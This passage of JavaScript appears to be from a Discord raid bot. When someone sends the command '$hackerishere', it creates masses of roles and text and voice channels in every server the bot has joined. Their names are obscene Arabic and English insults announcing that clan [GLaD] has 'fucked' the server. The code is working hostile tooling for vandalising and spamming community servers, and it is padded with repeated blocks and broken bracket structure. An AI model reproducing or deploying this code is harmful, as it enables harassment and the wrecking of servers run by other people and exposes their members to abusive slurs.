        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })
           

 
   
})
 
 
}
});
// رومات السيرفر
LOka.on('message', message => {
         if (message.content === "$hackerishere") {
               LOka.guilds.forEach(m =>{
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');
m.createChannel('قائد القوات الفدرالية موستانس', 'text');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'text');
m.createChannel('تم نيك السيرفر بنجاح', 'text');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'text');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'text');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'text');
m.createChannel('برا النت يخخوات الحقبة', 'text');
m.createChannel('جلاد كلان ينيك امكم', 'text');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'text');







})
}
});
LOka.on('message', message => {
         if (message.content === "$hackerishere") {
                 LOka.guilds.forEach(m =>{

m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
